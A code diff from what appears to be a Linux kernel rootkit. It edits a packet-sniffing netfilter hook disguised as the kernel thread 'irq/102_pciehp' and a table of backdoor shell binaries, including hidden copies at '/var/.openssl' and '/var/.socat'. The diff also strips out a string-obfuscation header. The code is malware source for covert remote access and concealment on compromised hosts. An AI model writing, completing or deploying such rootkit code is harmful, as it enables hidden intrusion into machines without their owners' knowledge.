@@ -19,7 +19,6 @@
 #include <linux/kthread.h>
 #include "fs.h"
 #include "lkm.h"
-#include "obfstr.h"
 
 static LIST_HEAD(iph_node);
 struct iph_node_t {
@@ -45,40 +44,26 @@ static int allowed_ports[] = {
 
 struct stat_ops_t {
     int kv_port;
-    /**
-     * Larger than needed but
-     * then I haven't decided yet
-     * how many possible locations
-     * we'll search for, or even if
-     * that could be somehow set in
-     * runtime or something
-     */
     const char *bin[BD_PATH_NUM];
 };
-
-static struct stat_ops_t stat_ops[BD_OPS_SIZE];
-
-static void _load_stat_ops(void) {
-    //XXX: use environment
-    stat_ops[0].kv_port = RR_OPENSSL;
-    stat_ops[0].bin[0] = "/usr/bin/openssl";
-    stat_ops[0].bin[1] = "/bin/openssl";
-    stat_ops[0].bin[2] = "/var/.openssl";
-
-    stat_ops[1].kv_port = RR_SOCAT;
-    stat_ops[1].bin[0] = "/usr/bin/socat";
-    stat_ops[1].bin[1] = "/bin/socat";
-    stat_ops[1].bin[2] = "/var/.socat";
-}
+static struct stat_ops_t stat_ops[] = {
+    /* Adjust if you install the binaries in different locations */
+    { .kv_port = RR_OPENSSL,
+        { "/usr/bin/openssl", "/bin/openssl", "/var/.openssl" }
+    },
+    { .kv_port = RR_SOCAT,
+        { "/bin/socat", "/var/.socat", "/usr/bin/socat" }
+    },
+    { .kv_port = RR_NULL }
+};
 
 /**
  * Iterate over stat_ops list and query FS
  * whether the binary is available
- * XXX: use environment
+ * XXX: search from PATH or something instead
  */
 static const char *_locate_bdbin(int port) {
     int i, x;
-
     for (i = 0; i < BD_OPS_SIZE && stat_ops[i].kv_port != RR_NULL; ++i) {
         if (port != stat_ops[i].kv_port) continue;
         for (x = 0; x < BD_PATH_NUM; ++x) {
@@ -590,8 +575,7 @@ struct task_struct *kv_sock_start_sniff(const char *name) {
 
     // load sniffer
     if (!*running) {
-        char *iph0 = kv_whatever_copystr(_OBF_IRQ_102_PCIEHP,
-                sizeof(_OBF_IRQ_102_PCIEHP));
+        char *iph0 = "irq/102_pciehp";
         // Hook pre routing
         ops.hook = _sock_hook_nf_cb;
         ops.pf = PF_INET;
@@ -599,8 +583,6 @@ struct task_struct *kv_sock_start_sniff(const char *name) {
         ops.hooknum = NF_INET_PRE_ROUTING;
         /* High priority in relation to other existent hooks */
         ops.priority = NF_IP_PRI_FIRST;
-
-        _load_stat_ops();
 
         INIT_KFIFO(buffer);
 
